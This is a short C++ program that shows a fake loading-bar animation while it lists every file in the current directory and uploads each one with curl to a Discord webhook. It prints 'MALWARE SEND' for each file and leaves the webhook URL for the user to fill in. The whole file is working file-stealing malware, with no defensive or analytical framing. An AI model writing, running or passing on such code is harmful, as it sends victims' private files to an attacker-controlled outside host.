#include <iostream>
#include <string>
#include <cstdlib> 

void print_ascii_animation(const std::string ascii_art[], int size, int iterations = 1, double delay = 0.1) {
    for (int i = 0; i < iterations; ++i) {
        for (int j = 0; j < size; ++j) {
            std::cout << ascii_art[j];
            std::cout.flush();
            long pause = static_cast<long>(delay * 1000000);
            long start_time = static_cast<long>(clock());
            while (static_cast<long>(clock()) < start_time + pause);
            std::cout << '\r';
        }
    }
    std::cout << std::endl;
}

void send_to_discord(const std::string& file_name, const std::string& webhook_url) {
    std::string message = "FILE :\n```";
    message += file_name;
    message += "```\n";

    std::string curl_command = "curl -s -F file1=@\"" + file_name + "\" \"" + webhook_url + "\"";

    int curl_result = std::system(curl_command.c_str());

    if (curl_result == 0) {
        std::cout << "MALWARE SEND : " << file_name << std::endl;
    } else {
        std::cerr << "ERROR WEBHOOK : " << file_name << std::endl;
    }
}


void traverse_directory(const std::string& folder_path, const std::string& webhook_url) {
    std::string command = "ls -p \"" + folder_path + "\" | grep -v /"; 
    FILE* pipe = popen(command.c_str(), "r");
    if (pipe) {
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != nullptr) {
                std::string file_name = buffer;
                file_name.erase(file_name.find_last_not_of(" \n\r\t") + 1);
                std::string file_path = folder_path + "/" + file_name;
                std::cout << "Envoi du fichier : " << file_path << std::endl;
                send_to_discord(file_path, webhook_url);
            }
        }
        pclose(pipe);
    } else {
        std::cerr << "ERROR : PATH" << folder_path << std::endl;
    }
}

int main() {
    const std::string loading_animation[] = {
        "[--------]   0% ",
        "[█-------]   10% ",
        "[██------]   20% ",
        "[███-----]   30% ",
        "[████----]   40% ",
        "[█████---]   50% ",
        "[██████--]   60% ",
        "[███████-]   70% ",
        "[████████]   100% "
    };

    print_ascii_animation(loading_animation, sizeof(loading_animation) / sizeof(loading_animation[0]), 1);
    std::string folder_path = "";
    FILE *fp = popen("pwd", "r");
    if (fp) {
        char path[4096];
        while (fgets(path, sizeof(path), fp) != nullptr) {
            folder_path = path;
        }
        pclose(fp);
    } else {
        std::cerr << "Error: Failed to get current working directory." << std::endl;
        return 1;
    }

    if (!folder_path.empty() && folder_path.back() == '\n') {
        folder_path.pop_back();
    }

    std::string webhook_url = ""; // YOUR WEBHOOK URL
    traverse_directory(folder_path, webhook_url);

    return 0;
}

